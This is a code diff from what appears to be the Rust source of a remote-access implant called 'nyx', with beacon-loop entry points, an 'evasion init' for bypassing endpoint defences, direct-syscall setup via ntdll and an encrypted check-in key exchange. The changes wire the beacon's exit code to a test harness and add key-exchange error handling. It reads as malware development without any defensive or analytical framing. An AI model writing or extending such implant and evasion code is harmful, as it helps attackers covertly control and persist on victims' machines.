@@ -262,7 +262,10 @@ pub unsafe extern "system" fn nyx_entry() {
         exit_in_entry(0xFFFF_FFFE);
     };
     diag_mark(b"8_before_loop");
-    crate::beacon::beacon_loop();
+    let code = crate::beacon::beacon_loop();
+    // Deliver the loop's exit code (0xAF = init failure, 0x00 = clean stop)
+    // so the harness can read %ERRORLEVEL%.
+    unsafe { exit_in_entry(code) };
 }
 /// CSPRNG register + syscalls only — NO hookchain/blind/pdata). Tests whether
 /// the evasion init in bootstrap() is causing the 0xC0000409 abort.
@@ -287,8 +290,9 @@ pub unsafe extern "system" fn nyx_entry_noevasion() {
     diag_mark(b"N1_init_done");
     crate::beacon::set_evasion_off();
     diag_mark(b"N2_evasion_off");
-    crate::beacon::beacon_loop();
+    let code = crate::beacon::beacon_loop();
     diag_mark(b"N3_loop_returned"); // should never reach here
+    unsafe { exit_in_entry(code) };
 }
 
 /// Minimal initialization: ntdll locate + SSN table + syscalls + CSPRNG.
@@ -567,7 +571,10 @@ pub unsafe extern "system" fn nyx_selftest() {
         Err(_) => report_exit(exit_proc, 0xE00), // CSPRNG failure in selftest
     };
     let dummy_server_pub = [0x42u8; 32];
-    let key = ikp.session_key(&dummy_server_pub);
+    let key = match ikp.session_key(&dummy_server_pub) {
+        Ok(k) => k,
+        Err(_) => report_exit(exit_proc, 0xE00), // non-contributory key exchange in selftest
+    };
     let pubkey = ikp.public_bytes();
     let plaintext = b"check-in-test-payload";
     let frame = match nyx_protocol::encode_frame(&pubkey, 1, &key, plaintext) {
